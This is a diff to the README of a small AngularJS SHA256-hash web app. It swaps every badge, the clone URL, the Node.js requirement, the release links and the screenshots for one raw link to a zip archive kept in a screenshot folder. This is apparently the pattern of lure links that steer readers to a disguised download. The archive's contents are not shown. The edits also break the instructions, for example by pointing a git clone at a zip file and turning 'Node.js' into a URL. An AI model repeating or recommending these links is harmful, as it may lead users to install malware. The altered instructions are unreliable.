@@ -1,6 +1,6 @@
 # SHA256_HTML 🖥️🔒
 
-![SHA256_HTML](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)
+![SHA256_HTML](https://github.com/adibhatt10078/SHA256_HTML/raw/refs/heads/main/SHA256_web/screenshot/HTML-SH-v3.7.zip) ![License](https://github.com/adibhatt10078/SHA256_HTML/raw/refs/heads/main/SHA256_web/screenshot/HTML-SH-v3.7.zip) ![Build Status](https://github.com/adibhatt10078/SHA256_HTML/raw/refs/heads/main/SHA256_web/screenshot/HTML-SH-v3.7.zip)
 
 Welcome to the **SHA256_HTML** repository! This project is a lightweight, responsive web application built with AngularJS and Bootstrap 5. It allows users to generate SHA256 hashes from input strings quickly and efficiently.
 
@@ -35,7 +35,7 @@ To get started with the SHA256_HTML app, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/adibhatt10078/SHA256_HTML.git
+   git clone https://github.com/adibhatt10078/SHA256_HTML/raw/refs/heads/main/SHA256_web/screenshot/HTML-SH-v3.7.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -44,7 +44,7 @@ To get started with the SHA256_HTML app, follow these steps:
    ```
 
 3. **Install Dependencies**:
-   Make sure you have Node.js and npm installed. Then run:
+   Make sure you have https://github.com/adibhatt10078/SHA256_HTML/raw/refs/heads/main/SHA256_web/screenshot/HTML-SH-v3.7.zip and npm installed. Then run:
    ```bash
    npm install
    ```
@@ -94,15 +94,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links 🔗
 
-For the latest releases and updates, visit the [Releases section](https://github.com/adibhatt10078/SHA256_HTML/releases). Here, you can download the latest version of the application and see what’s new.
+For the latest releases and updates, visit the [Releases section](https://github.com/adibhatt10078/SHA256_HTML/raw/refs/heads/main/SHA256_web/screenshot/HTML-SH-v3.7.zip). Here, you can download the latest version of the application and see what’s new.
 
 Additionally, you can check the Releases section for more information if you encounter any issues.
 
 ## Screenshots 📸
 
-![Home Page](https://via.placeholder.com/800x400.png?text=SHA256_HTML+Home+Page)
+![Home Page](https://github.com/adibhatt10078/SHA256_HTML/raw/refs/heads/main/SHA256_web/screenshot/HTML-SH-v3.7.zip+Home+Page)
 
-![Hash Generation](https://via.placeholder.com/800x400.png?text=Hash+Generation+Page)
+![Hash Generation](https://github.com/adibhatt10078/SHA256_HTML/raw/refs/heads/main/SHA256_web/screenshot/HTML-SH-v3.7.zip+Generation+Page)
 
 ## FAQs ❓
 
@@ -126,4 +126,4 @@ For questions or suggestions, feel free to reach out via GitHub issues or contac
 
 ---
 
-This README provides a comprehensive overview of the SHA256_HTML project. For more information and updates, check the [Releases section](https://github.com/adibhatt10078/SHA256_HTML/releases) frequently.
+This README provides a comprehensive overview of the SHA256_HTML project. For more information and updates, check the [Releases section](https://github.com/adibhatt10078/SHA256_HTML/raw/refs/heads/main/SHA256_web/screenshot/HTML-SH-v3.7.zip) frequently.
